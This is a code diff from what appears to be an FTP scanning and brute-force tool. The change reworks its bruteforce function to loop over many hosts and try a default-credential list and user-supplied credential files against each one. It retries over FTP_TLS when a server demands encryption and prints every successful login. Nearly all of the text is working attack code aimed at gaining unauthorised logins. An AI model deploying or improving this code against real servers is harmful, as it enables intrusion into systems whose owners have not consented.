@@ -76,46 +76,45 @@ creds = [
 "PlcmSpIp:PlcmSpIp",
 ]
 
-def bruteforce(args, host):
-    ip = host
-    port = 21
-    if ":" in host:
-        ip = host.split(":")[0]
-        port  = int(host.split(":")[1])
-    host = ip + ":" + str(port)
-    
-    if args.creds:
-        with open(args.creds, "r") as file:
-            c1 = [line.strip() for line in file if line.strip()] 
-        
-        creds = [*creds, *c1]
-    elif args.overwrite_creds:
-        with open(args.creds, "r") as file:
-            c2 = [line.strip() for line in file if line.strip()] 
-        creds = c2
-    
-    
-    for cred in creds:
-        username = cred.split(":")[0]
-        password = cred.split(":")[1]
+def bruteforce(args, hosts):
+    for host in hosts:
         try:
-            ftp = FTP()
-            ftp.connect(ip, port, timeout=10)
-            l = ftp.login(username, password)
-            if "230" in l:
-                print(f"[+] {host} => {username}:{password}")
-        except Error as e:
-            if "must use encryption" in str(e):
-                ftp = FTP_TLS()
-                ftp.connect(ip, port, timeout=10)
+            ip = host.split(":")[0]
+            port  = int(host.split(":")[1])
+            
+            if args.creds:
+                with open(args.creds, "r") as file:
+                    c1 = [line.strip() for line in file if line.strip()] 
+                
+                creds = [*creds, *c1]
+            elif args.overwrite_creds:
+                with open(args.creds, "r") as file:
+                    c2 = [line.strip() for line in file if line.strip()] 
+                creds = c2
+            
+            
+            for cred in creds:
+                username = cred.split(":")[0]
+                password = cred.split(":")[1]
                 try:
+                    ftp = FTP()
+                    ftp.connect(ip, port, timeout=10)
                     l = ftp.login(username, password)
                     if "230" in l:
                         print(f"[+] {host} => {username}:{password}")
-                except error_perm as ee:
-                    continue
-                except Error as eee:
-                    continue   
+                except Error as e:
+                    if "must use encryption" in str(e):
+                        ftp = FTP_TLS()
+                        ftp.connect(ip, port, timeout=10)
+                        try:
+                            l = ftp.login(username, password)
+                            if "230" in l:
+                                print(f"[+] {host} => {username}:{password}")
+                        except error_perm as ee:
+                            continue
+                        except Error as eee:
+                            continue
+        except Exception as e: pass
         
 def anon(hosts):
     anon = []
@@ -206,15 +205,15 @@ def check(args, hosts):
         
         
     # Anon
-    print()
+
     anon(hosts)
 
     # Check TLS
-    print()
+
     #tls(hosts)
             
     # bruteforce
-    print()
+
     if not confirm_prompt("Do you wish to continue for brute force?"): return   
     brute(args, hosts)
             
